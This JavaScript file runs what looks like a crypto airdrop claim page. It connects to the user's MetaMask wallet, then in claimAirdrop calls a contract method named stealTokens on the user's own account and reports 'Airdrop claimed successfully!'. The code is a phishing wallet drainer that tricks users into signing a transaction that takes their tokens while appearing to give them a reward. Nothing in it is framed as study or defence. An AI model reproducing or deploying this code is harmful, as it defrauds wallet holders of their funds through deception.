async function connectMetaMask() {
    if (isConnected) return;

    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            console.log("Connected to MetaMask:", accounts);
            isConnected = true;

            document.getElementById('claimAirdropButton').disabled = false;
            document.getElementById('connectButton').disabled = true;
        } catch (error) {
            console.error("MetaMask connection failed:", error);
            alert("Failed to connect to MetaMask.");
        }
    } else {
        alert("MetaMask is not installed. Please install it to continue.");
    }
}

async function claimAirdrop() {
    if (!accounts || !contractABI || !contractAddress) {
        alert("Configuration is missing. Connect MetaMask first.");
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert("Airdrop claimed successfully!");
    } catch (error) {
        console.error("Error claiming airdrop:", error);
        alert("Failed to claim the airdrop.");
    }
}



